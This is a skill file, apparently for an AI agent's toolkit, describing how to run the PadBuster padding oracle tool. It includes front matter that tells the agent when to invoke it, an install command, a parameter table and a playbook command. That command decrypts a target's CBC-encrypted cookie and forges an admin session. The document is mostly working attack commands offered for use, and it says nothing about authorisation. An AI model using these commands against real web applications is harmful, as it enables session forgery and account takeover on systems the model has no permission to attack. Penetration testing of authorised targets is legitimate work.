---
name: padbuster-padding-oracle
description: "Web application exploitation scenario. Signals: web vulnerability, injection, encrypt arbitrary plaintext, cookie mode, no URL encoding."
zh-signals: "PadBuster: Web应用漏洞利用场景。信号:web漏洞,注入,加密任意明文,cookie 模式,不 URL 编码。"
when-to-use: "Use when a CBC-encrypted cookie or parameter shows padding oracle behavior and you need to decrypt it or forge arbitrary plaintext such as an admin session. Requires the target URL, ciphertext, block size, and an error fingerprint."
---

# PadBuster

- Attack Category: C09 Web Application Vulnerability Exploitation
- Upstream Repository: https://github.com/AonCyberLabs/PadBuster
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/AonCyberLabs/PadBuster
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `perl padBuster.pl URL encData 16 -encoding 0` | Padding oracle attack |
| `-plaintext 'user=admin'` | Encrypt arbitrary plaintext |
| `-cookies` | Cookie mode |
| `-noencode` | No URL encoding |
| `-error 'invalid'` | Error fingerprint |

## Attack Scenario Playbook

### CBC Padding Oracle Decryption and Session Forgery

```bash
perl padBuster.pl https://target/login.jsp 'vlP6xG9f...' 8 -cookies auth=
# Automatically decrypts byte by byte, then use -plaintext to forge an admin session and write it back encrypted
```

## Notes

A classic CBC padding oracle tool; block size 8/16 is auto-detected and automatic error fingerprint learning is supported.
